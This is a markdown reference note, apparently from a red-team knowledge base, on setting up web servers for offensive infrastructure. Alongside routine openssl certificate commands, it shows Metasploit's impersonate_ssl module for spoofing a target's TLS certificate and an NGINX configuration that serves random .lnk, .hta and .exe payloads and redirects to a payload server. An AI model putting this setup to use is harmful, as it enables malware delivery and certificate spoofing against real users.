---
author(s):
  - Userware
tags:
  - offensive-infrastructure
  - "#T1001-003"
---
# Web Servers

## Issue TLS Certificate

### Common Files

```
/etc/ssl/certs/
```

### Installation

Install the packages according to your package manager.

![[Core Utilities#^78a260]]

### View Certificate

```
$ echo | openssl s_client -servername <target_IP> -connect <target_IP>:443 2>/dev/null | openssl x509 -noout -issuer -subject -dates
```

### Add Self-Signed Certificate

```
$ openssl -req -new -x509 -nodes -out cert.crt -keyout private.key

$ cat private.key cert.crt > fullchain.pem
```

### Impersonate TLS Certificate

TODO: Fill this info

```
msf > use auxiliary/gather/impersonate_ssl

msf auxiliary(gather/impersonate_ssl) > options

Module options (auxiliary/gather/impersonate_ssl):

   Name                     Current Setting  Required  Description
   ----                     ---------------  --------  -----------
   ADD_CN                                    no        Add CN to match spoofed site name (e.g. *.example.com)
   ADD_SAN                                   no        Add SAN entries to certificate (e.g. alt.example.com,127.0.0.1)
   CA_CERT                                   no        CA Public certificate
   EXPIRATION                                no        Date the new cert should expire (e.g. 06 May 2012, YESTERDAY or NOW)
   OUT_FORMAT               PEM              yes       Output format (Accepted: DER, PEM)
   PRIVKEY                                   no        Sign the cert with your own CA private key
   PRIVKEY_PASSWORD                          no        Password for private key specified in PRIV_KEY (if applicable)
   RHOSTS                                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                                       basics/using-metasploit.html
   RPORT                    443              yes       The target port (TCP)
   SSLServerNameIndication                   no        SSL/TLS Server Name Indication (SNI)


View the full module info with the info, or info -d command.

msf auxiliary(gather/impersonate_ssl) > run rhosts=<target_IP> rport=<target_PORT> [verbose=true]
```


## Hosting Payloads

```
# Serving Random Payloads with NGINX
# add set_random module https://github.com/openresty/set-misc-nginx-module#set_random
# edit file /etc/nginx/sites-enabled/default

set_random $uri 1 3;

map $uri $payloads {
    1 /payload.lnk;
    2 /payload.hta;
    3 /payload.exe;
}

server {
        listen 80 default_server;
        listen [::]:80 default_server;

        server_name _;

        root /var/www;

        index index.html;

        location ^/payload/?$ {
            rewrite ^/payload/?$ /$payloads redirect;
        }

        location ^/payload\.(exe|lnk|hta) {
            rewrite ^/payload\.(exe|lnk|hta) http://PAYLOAD_SERVER_IP$request_uri redirect;
        }

        location / {
                try_files $uri $uri/ =404;
        }
}
```

---
## References

### Source Repositories

- [jivoi: Serving Random Payloads with NGINX](https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9)

### Mozilla

- [Mozilla: SSL Configuration Generator](https://ssl-config.mozilla.org/)

### Electronic Frontier Foundation

- [Certbot](https://certbot.eff.org/)

- [Let's Encrypt](https://letsencrypt.org/)

### Cloudflare

- [Cloudflare Free SSL/TLS](https://www.cloudflare.com/application-services/products/ssl/)

### ZeroSSL

- [ZeroSSL](https://zerossl.com/)

### SSLShopper

- [SSLShopper](https://www.sslshopper.com/ssl-certificate-list.html)

### Jeff Atkinson

- [Jeff Atkinson: Fingerprinting Encrypted](https://old.zeek.org/brocon2018/slides/Jeff_Atkinson._Fingerprinting_Encrypted.pptx)